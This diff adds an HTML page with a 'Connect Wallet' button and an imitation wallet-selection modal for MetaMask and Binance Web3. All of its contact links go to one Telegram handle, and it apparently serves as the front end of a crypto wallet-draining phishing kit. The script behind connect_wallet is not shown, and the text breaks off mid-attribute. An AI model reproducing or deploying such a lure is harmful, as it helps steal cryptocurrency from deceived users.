@@ -1,0 +1,438 @@
+﻿<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://t.me/cryptocoder0</title>
+    <link rel="stylesheet" href="assets/modalweb3.css">
+    
+    
+</head>
+
+<style>
+    .container {
+        max-width: 1200px;
+        width: 100%;
+        margin-left: auto;
+        margin-right: auto;
+        height: 100vh;
+        align-items: center;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+    }
+
+    body, html {
+        padding: 0;
+        margin: 0;
+        background-color: blue;
+    }
+
+    header {
+        display: flex;
+        justify-content: center;
+    }
+
+    header > img {
+        width: 220px;
+        height: 23px;
+    }
+
+    button {
+        background-color: white;
+        color: #000;
+        border: 0;
+       
+        height: 40px;
+        border-radius: 10px;
+        cursor: pointer;
+        border: 2px solid white;
+    }
+
+    button:hover {
+        background-color: yellow;
+        border: 2px solid yellow;
+    }
+
+    .main_content {
+        display: flex;
+        justify-content: center;
+        margin-top: 25px;
+    }
+
+    .official_contacts {
+        display: flex;
+        color: white;
+        flex-direction: column;
+        margin-top: 25px;
+        font-family: Arial, Helvetica, sans-serif;
+        text-align: center;
+    }
+
+    .official_contacts > span > a {
+        font-size: 16px;
+        color: yellow;
+    }
+</style>
+  <style>[data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#0E76FD;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}</style>
+
+<body>
+    <div class="container">
+        <header>
+           <img src="assets/VULTR-DEMO.png" alt="" style=" width: 300px; height: auto; ">
+        </header>
+
+        <div class="main_content">
+            <button id="connectButton">Connect Wallet</button>
+        </div>
+
+        <div class="official_contacts">
+            <span>Official website: <a href="https://t.me/cryptocoder0">link</a></span>
+            <span>Telegram support: <a href="https://t.me/cryptocoder0">link</a></span>
+        </div>
+    </div>  
+    
+    
+   <div class="iekbcc0" data-rk="" id="openmodal" style="display: none;">
+    <div id="openmodal-close" class="iekbcc0 ju367v4 ju367v8q _9pm4ki3 ju367v9g ju367vb2 ju367va ju367v2q ju367v8q" data-rk="" aria-labelledby="rk_connect_title" aria-modal="true" role="dialog">
+        <div tabindex="0"></div>
+        <div tabindex="-1" class="_9pm4ki5 ju367va ju367v15 ju367v8r" role="document" style="outline: none;">
+            <div class="iekbcc0">
+                <div class="iekbcc0 _1ckjpok4 _1ckjpok1 ju367vb5 ju367vdq ju367vp ju367vt ju367vv ju367vek ju367va ju367v15 ju367v6c ju367v8r">
+                    <div class="iekbcc0 ju367v84 ju367v6d ju367v6y ju367v7j">
+                        <div class="iekbcc0 ju367va ju367v14" style="max-height: 468px;">
+                            <div class="iekbcc0 ju367va ju367v15 ju367v4y _1vwt0cg4">
+                                <div class="iekbcc0 ju367va ju367v2r">
+                                    <div class="iekbcc0 ju367v3s ju367v93"></div>
+                                    <div class="iekbcc0 ju367v7a ju367v7v ju367v3h ju367v6k ju367v86">
+                                        <h1 class="iekbcc0 ju367vgt ju367v16 ju367v1b ju367v1i ju367v2v" id="rk_connect_title" data-testid="rk-connect-header-label">Connect a Wallet</h1>
+                                    </div>
+                                    <div class="iekbcc0 ju367v4d">
+                                        <button class="iekbcc0 iekbcc9 ju367v4 ju367v9z ju367vc5 ju367vs ju367vt ju367vv ju367vfe ju367va ju367v2b ju367v2q ju367v8t ju367v93 _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" aria-label="Close" type="button" style="will-change: transform;">
+                                            <svg aria-hidden="true" fill="none" height="10" viewbox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="iekbcc0 ju367v6p _1vwt0cg2 ju367v7a ju367v7v">
+                                    <div class="iekbcc0 ju367v3n ju367v48 ju367v33 ju367v4y"><div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1h ju367v2v">Wallets sugeridas</div></div>
+                                    <div class="iekbcc0 ju367va ju367v15 ju367v1n">
+                                        <div class="iekbcc0 ju367va ju367v15">
+                                            <button onclick="connect_wallet('MetaMask')" class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8t ju367v9e ju367vb0 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-metaMask" style="will-change: transform;">
+                                                <div class="iekbcc0 ju367vgt ju367v16 ju367v1a ju367v1h ju367v8t">
+                                                    <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+                                                        <div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v93" role="img" style="background: rgb(255, 255, 255);">
+                                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                                    transition: opacity 0.15s linear 0s;
+                                                                    user-select: none;
+                                                                    background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjQuMDg5MSAzLjExOTlMMTUuMzQ0NiA5LjYxNDU2TDE2Ljk2MTcgNS43ODI4TDI0LjA4OTEgMy4xMTk5WiIgZmlsbD0iI0UyNzYxQiIgc3Ryb2tlPSIjRTI3NjFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0zLjkwMjA3IDMuMTE5OUwxMi41NzYzIDkuNjc2MDhMMTEuMDM4MyA1Ljc4MjhMMy45MDIwNyAzLjExOTlaIiBmaWxsPSIjRTQ3NjFCIiBzdHJva2U9IiNFNDc2MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTIwLjk0MjkgMTguMTc0NUwxOC42MTM5IDIxLjc0MjZMMjMuNTk3IDIzLjExMzZMMjUuMDI5NSAxOC4yNTM2TDIwLjk0MjkgMTguMTc0NVoiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMi45NzkyOSAxOC4yNTM2TDQuNDAzMDEgMjMuMTEzNkw5LjM4NjA3IDIxLjc0MjZMNy4wNTcxMyAxOC4xNzQ1TDIuOTc5MjkgMTguMjUzNloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4xMDQ4MyAxMi4xNDU2TDcuNzE2MjYgMTQuMjQ2MUwxMi42NjQyIDE0LjQ2NThMMTIuNDg4NCA5LjE0ODc3TDkuMTA0ODMgMTIuMTQ1NloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTguODg2NCAxMi4xNDU2TDE1LjQ1ODkgOS4wODcyNUwxNS4zNDQ2IDE0LjQ2NThMMjAuMjgzNyAxNC4yNDYxTDE4Ljg4NjQgMTIuMTQ1NloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4zODYwNiAyMS43NDI2TDEyLjM1NjYgMjAuMjkyNUw5Ljc5MDMzIDE4LjI4ODhMOS4zODYwNiAyMS43NDI2WiIgZmlsbD0iI0U0NzYxQiIgc3Ryb2tlPSIjRTQ3NjFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xNS42MzQ3IDIwLjI5MjVMMTguNjEzOSAyMS43NDI2TDE4LjIwMDkgMTguMjg4OEwxNS42MzQ3IDIwLjI5MjVaIiBmaWxsPSIjRTQ3NjFCIiBzdHJva2U9IiNFNDc2MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE4LjYxMzkgMjEuNzQyNkwxNS42MzQ3IDIwLjI5MjVMMTUuODcxOSAyMi4yMzQ4TDE1Ljg0NTYgMjMuMDUyMUwxOC42MTM5IDIxLjc0MjZaIiBmaWxsPSIjRDdDMUIzIiBzdHJva2U9IiNEN0MxQjMiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTkuMzg2MDYgMjEuNzQyNkwxMi4xNTQ0IDIzLjA1MjFMMTIuMTM2OCAyMi4yMzQ4TDEyLjM1NjYgMjAuMjkyNUw5LjM4NjA2IDIxLjc0MjZaIiBmaWxsPSIjRDdDMUIzIiBzdHJva2U9IiNEN0MxQjMiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTEyLjE5ODQgMTcuMDA1Nkw5LjcyMDAyIDE2LjI3NjJMMTEuNDY4OSAxNS40NzY1TDEyLjE5ODQgMTcuMDA1NloiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuNzkyOCAxNy4wMDU2TDE2LjUyMjMgMTUuNDc2NUwxOC4yOCAxNi4yNzYyTDE1Ljc5MjggMTcuMDA1NloiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4zODYwNiAyMS43NDI2TDkuODA3OTEgMTguMTc0NUw3LjA1NzEyIDE4LjI1MzZMOS4zODYwNiAyMS43NDI2WiIgZmlsbD0iI0NENjExNiIgc3Ryb2tlPSIjQ0Q2MTE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xOC4xOTIxIDE4LjE3NDVMMTguNjEzOSAyMS43NDI2TDIwLjk0MjkgMTguMjUzNkwxOC4xOTIxIDE4LjE3NDVaIiBmaWxsPSIjQ0Q2MTE2IiBzdHJva2U9IiNDRDYxMTYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTIwLjI4MzcgMTQuMjQ2MUwxNS4zNDQ2IDE0LjQ2NThMMTUuODAxNiAxNy4wMDU3TDE2LjUzMTEgMTUuNDc2NUwxOC4yODg4IDE2LjI3NjJMMjAuMjgzNyAxNC4yNDYxWiIgZmlsbD0iI0NENjExNiIgc3Ryb2tlPSIjQ0Q2MTE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik05LjcyMDAyIDE2LjI3NjJMMTEuNDc3NyAxNS40NzY1TDEyLjE5ODQgMTcuMDA1N0wxMi42NjQyIDE0LjQ2NThMNy43MTYyNiAxNC4yNDYxTDkuNzIwMDIgMTYuMjc2MloiIGZpbGw9IiNDRDYxMTYiIHN0cm9rZT0iI0NENjExNiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNNy43MTYyNiAxNC4yNDYxTDkuNzkwMzMgMTguMjg4OEw5LjcyMDAyIDE2LjI3NjJMNy43MTYyNiAxNC4yNDYxWiIgZmlsbD0iI0U0NzUxRiIgc3Ryb2tlPSIjRTQ3NTFGIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xOC4yODg4IDE2LjI3NjJMMTguMjAwOSAxOC4yODg4TDIwLjI4MzcgMTQuMjQ2MUwxOC4yODg4IDE2LjI3NjJaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTEyLjY2NDIgMTQuNDY1OEwxMi4xOTg0IDE3LjAwNTdMMTIuNzc4NCAyMC4wMDI1TDEyLjkxMDIgMTYuMDU2NUwxMi42NjQyIDE0LjQ2NThaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE1LjM0NDYgMTQuNDY1OEwxNS4xMDczIDE2LjA0NzdMMTUuMjEyOCAyMC4wMDI1TDE1LjgwMTYgMTcuMDA1N0wxNS4zNDQ2IDE0LjQ2NThaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE1LjgwMTYgMTcuMDA1NkwxNS4yMTI4IDIwLjAwMjVMMTUuNjM0NyAyMC4yOTI1TDE4LjIwMDkgMTguMjg4OEwxOC4yODg4IDE2LjI3NjJMMTUuODAxNiAxNy4wMDU2WiIgZmlsbD0iI0Y2ODUxQiIgc3Ryb2tlPSIjRjY4NTFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik05LjcyMDAyIDE2LjI3NjJMOS43OTAzMyAxOC4yODg4TDEyLjM1NjYgMjAuMjkyNUwxMi43Nzg0IDIwLjAwMjVMMTIuMTk4NCAxNy4wMDU2TDkuNzIwMDIgMTYuMjc2MloiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuODQ1NiAyMy4wNTIxTDE1Ljg3MTkgMjIuMjM0OEwxNS42NTIyIDIyLjA0MTRIMTIuMzM5TDEyLjEzNjggMjIuMjM0OEwxMi4xNTQ0IDIzLjA1MjFMOS4zODYwNiAyMS43NDI2TDEwLjM1MjggMjIuNTMzNkwxMi4zMTI2IDIzLjg5NThIMTUuNjc4NkwxNy42NDcyIDIyLjUzMzZMMTguNjEzOSAyMS43NDI2TDE1Ljg0NTYgMjMuMDUyMVoiIGZpbGw9IiNDMEFEOUUiIHN0cm9rZT0iI0MwQUQ5RSIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuNjM0NyAyMC4yOTI1TDE1LjIxMjggMjAuMDAyNUgxMi43Nzg0TDEyLjM1NjYgMjAuMjkyNUwxMi4xMzY4IDIyLjIzNDhMMTIuMzM5IDIyLjA0MTRIMTUuNjUyMkwxNS44NzE5IDIyLjIzNDhMMTUuNjM0NyAyMC4yOTI1WiIgZmlsbD0iIzE2MTYxNiIgc3Ryb2tlPSIjMTYxNjE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0yNC40NTgzIDEwLjAzNjRMMjUuMjA1MyA2LjQ1MDcyTDI0LjA4OTEgMy4xMTk5TDE1LjYzNDcgOS4zOTQ4NUwxOC44ODY0IDEyLjE0NTZMMjMuNDgyNyAxMy40OTAzTDI0LjUwMjIgMTIuMzAzOEwyNC4wNjI4IDExLjk4NzRMMjQuNzY1OCAxMS4zNDU5TDI0LjIyMSAxMC45MjRMMjQuOTI0IDEwLjM4NzlMMjQuNDU4MyAxMC4wMzY0WiIgZmlsbD0iIzc2M0QxNiIgc3Ryb2tlPSIjNzYzRDE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0yLjc5NDcyIDYuNDUwNzJMMy41NDE3NCAxMC4wMzY0TDMuMDY3MTcgMTAuMzg3OUwzLjc3MDI0IDEwLjkyNEwzLjIzNDE1IDExLjM0NTlMMy45MzcyMiAxMS45ODc0TDMuNDk3OCAxMi4zMDM4TDQuNTA4NDcgMTMuNDkwM0w5LjEwNDgzIDEyLjE0NTZMMTIuMzU2NiA5LjM5NDg1TDMuOTAyMDcgMy4xMTk5TDIuNzk0NzIgNi40NTA3MloiIGZpbGw9IiM3NjNEMTYiIHN0cm9rZT0iIzc2M0QxNiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMjMuNDgyNyAxMy40OTAzTDE4Ljg4NjQgMTIuMTQ1NkwyMC4yODM3IDE0LjI0NjFMMTguMjAwOSAxOC4yODg4TDIwLjk0MjkgMTguMjUzNkgyNS4wMjk1TDIzLjQ4MjcgMTMuNDkwM1oiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4xMDQ4NCAxMi4xNDU2TDQuNTA4NDggMTMuNDkwM0wyLjk3OTI5IDE4LjI1MzZINy4wNTcxM0w5Ljc5MDMzIDE4LjI4ODhMNy43MTYyNiAxNC4yNDYxTDkuMTA0ODQgMTIuMTQ1NloiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuMzQ0NiAxNC40NjU4TDE1LjYzNDcgOS4zOTQ4NUwxNi45NzA1IDUuNzgyOEgxMS4wMzgzTDEyLjM1NjYgOS4zOTQ4NUwxMi42NjQyIDE0LjQ2NThMMTIuNzY5NiAxNi4wNjUzTDEyLjc3ODQgMjAuMDAyNUgxNS4yMTI4TDE1LjIzMDQgMTYuMDY1M0wxNS4zNDQ2IDE0LjQ2NThaIiBmaWxsPSIjRjY4NTFCIiBzdHJva2U9IiNGNjg1MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPC9zdmc+Cg==');
+                                                                    background-repeat: no-repeat;
+                                                                    opacity: 1;
+                                                                "></div>
+                                                            <div class="iekbcc0 ju367vc5 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9e"></div>
+                                                        </div>
+                                                        <div class="iekbcc0"><div class="iekbcc0">MetaMask</div></div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                        </div>
+                                        <div class="iekbcc0 ju367va ju367v15">
+                                            <button onclick="connect_wallet('Binance')" class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8t ju367v9e ju367vb0 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-metaMask" style="will-change: transform;">
+                                                <div class="iekbcc0 ju367vgt ju367v16 ju367v1a ju367v1h ju367v8t">
+                                                    <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+                                                        <div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v93" role="img" style="background: rgb(255, 255, 255);">
+                                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                                    transition: opacity 0.15s linear 0s;
+                                                                    user-select: none;
+                                                                    background-image: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KDTwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIEdlbmVyYXRvcjogU1ZHIFJlcG8gTWl4ZXIgVG9vbHMgLS0+Cjxzdmcgd2lkdGg9IjgwMHB4IiBoZWlnaHQ9IjgwMHB4IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8c3R5bGU+CiAgICAgIC5zdDF7ZmlsbDojZmZmfQogICA8L3N0eWxlPgogICA8ZyBpZD0iSWNvbiI+CiAgICAgIDxjaXJjbGUgY3g9IjUxMiIgY3k9IjUxMiIgcj0iNTEyIiBzdHlsZT0iZmlsbDojZjNiYTJmIi8+CiAgICAgIDxwYXRoIGNsYXNzPSJzdDEiIGQ9Ik00MDQuOSA0NjggNTEyIDM2MC45bDEwNy4xIDEwNy4yIDYyLjMtNjIuM0w1MTIgMjM2LjMgMzQyLjYgNDA1Ljd6Ii8+CiAgICAgIDxwYXRoIHRyYW5zZm9ybT0icm90YXRlKC00NS4wMDEgMjk4LjYyOSA1MTEuOTk4KSIgY2xhc3M9InN0MSIgZD0iTTI1NC42IDQ2Ny45aDg4LjFWNTU2aC04OC4xeiIvPgogICAgICA8cGF0aCBjbGFzcz0ic3QxIiBkPSJNNDA0LjkgNTU2IDUxMiA2NjMuMWwxMDcuMS0xMDcuMiA2Mi40IDYyLjNoLS4xTDUxMiA3ODcuNyAzNDIuNiA2MTguM2wtLjEtLjF6Ii8+CiAgICAgIDxwYXRoIHRyYW5zZm9ybT0icm90YXRlKC00NS4wMDEgNzI1LjM2NCA1MTIuMDMyKSIgY2xhc3M9InN0MSIgZD0iTTY4MS4zIDQ2OGg4OC4xdjg4LjFoLTg4LjF6Ii8+CiAgICAgIDxwYXRoIGNsYXNzPSJzdDEiIGQ9Ik01NzUuMiA1MTIgNTEyIDQ0OC43bC00Ni43IDQ2LjgtNS40IDUuMy0xMS4xIDExLjEtLjEuMS4xLjEgNjMuMiA2My4yIDYzLjItNjMuM3oiLz4KICAgPC9nPgo8L3N2Zz4=');
+                                                                    background-repeat: no-repeat;
+                                                                    opacity: 1;
+                                                                "></div>
+                                                            <div class="iekbcc0 ju367vc5 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9e"></div>
+                                                        </div>
+                                                        <div class="iekbcc0"><div class="iekbcc0">Binance Web3</div></div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                        </div>
+
+<div class="iekbcc0 ju367va ju367v15"><button class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8t ju367v9e ju367vb0 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-trust" style="will-change: transform;"><div class="iekbcc0 ju367vgt ju367v16 ju367v1a ju367v1h ju367v8t"><div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s"><div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v93" role="img" style="background: rgb(255, 255, 255);"><div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="transition: opacity 0.15s linear 0s; user-select: none; background-image: 